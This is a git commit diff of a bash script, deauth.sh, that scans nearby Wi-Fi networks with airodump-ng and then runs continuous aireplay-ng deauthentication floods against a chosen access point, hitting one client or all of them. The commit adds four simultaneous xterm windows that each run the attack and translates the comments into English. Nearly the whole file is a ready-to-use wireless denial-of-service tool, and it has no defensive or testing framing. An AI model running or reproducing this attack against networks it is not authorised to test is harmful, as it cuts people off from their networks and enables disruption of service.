67c3c96c5de5733f09af83a754f46ddb2faf0bea
limmmw <nurhhalim4@gmail.com>
2025-07-01 15:43:49 +0700

    update

--- deauth.sh
+++ deauth.sh
@@ -1,53 +1,78 @@
 #!/bin/bash
 
-# Ganti interface dengan interfacemu
+# Replace with your wireless interface
 IFACE="wlp3s0"
 
-echo "[*] Activate monitor mode..."
-sudo ip link set $IFACE down
-sudo iw dev $IFACE set type monitor
-sudo ip link set $IFACE up
+cleanup() {
+    echo -e "\n[!] Ctrl+C detected. Killing Deauther Attacks..."
+    for pid in "${XTERM_PIDS[@]}"; do
+        kill "$pid" 2>/dev/null
+    done
+    exit 1
+}
+trap cleanup SIGINT
 
-echo "[*] Running airodump-ng (Enter Ctrl+C if you have found a target)..."
+echo "[*] Activating Scanning mode..."
+
+echo "[*] Running airodump-ng (Press Ctrl+C when target is found)..."
 sleep 2
 sudo airodump-ng $IFACE
 
 echo
-read -p "[?] Enter BSSID target (WiFi AP): " BSSID
+read -p "[?] Enter target BSSID (WiFi AP): " BSSID
 read -p "[?] Enter channel (CH): " CH
 
 echo
-echo "[1] 1 Target"
-echo "[2] All Target"
-read -p "[?] Chose Attacking Mode (1/2): " MODE
+echo "[1] Single Target"
+echo "[2] All Clients"
+read -p "[?] Choose attack mode (1/2): " MODE
 
 if [ "$MODE" == "1" ]; then
-    read -p "[?] Enter Client MAC address: " CLIENT
+    read -p "[?] Enter client MAC address: " CLIENT
 fi
 
-echo "[*] Set channel to $CH..."
+echo "[*] Setting channel to $CH..."
 sudo iwconfig $IFACE channel $CH
 sleep 1
 
-echo
 if [ "$MODE" == "1" ]; then
-    echo "[*] Running Deauth Continuously to Target $CLIENT..."
-    sudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT $IFACE
+    DEAUTH_CMD="tput setaf 1; echo '[*] Deauthing client $CLIENT on BSSID $BSSID'; sudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT $IFACE"
 else
-    echo "[*] Running Deauth Continuously to All Target..."
-    sudo aireplay-ng --deauth 0 -a $BSSID $IFACE
+    DEAUTH_CMD="tput setaf 1; echo '[*] Deauthing all clients on BSSID $BSSID'; sudo aireplay-ng --deauth 0 -a $BSSID $IFACE"
 fi
 
+launch_xterm_at() {
+    local GEOMETRY=$1
+    xterm -geometry "$GEOMETRY" -fg red -fa 'Monospace' -fs 10 -e bash -c "$DEAUTH_CMD" &
+    XTERM_PIDS+=($!)
+}
+
+XTERM_PIDS=()
+echo "[*] Launching Deauther Attack..."
+
+# Top-left
+launch_xterm_at "80x24+0+0"
+
+# Top-right
+launch_xterm_at "80x24-0+0"
+
+# Bottom-left
+launch_xterm_at "80x24+0-0"
+
+# Bottom-right
+launch_xterm_at "80x24-0-0"
+
+wait
+
 echo
-read -p "[?] Would you like to set interface to normal mode? (y/n): " Answer
+read -p "[?] Do you want to return the interface to normal mode? (y/n): " Answer
 
 if [[ "$Answer" == "y" || "$Answer" == "Y" ]]; then
-    echo "[*] Return to Normal mode..."
+    echo "[*] Restoring managed mode..."
     sudo ip link set $IFACE down
     sudo iw dev $IFACE set type managed
     sudo ip link set $IFACE up
-    echo "[✔] Interface Return to Normal mode."
+    echo "[✔] Interface is back in managed mode."
 else
-    echo "[!] Interface Keep in Monitor mode."
+    echo "[!] Interface remains in monitor mode."
 fi
-
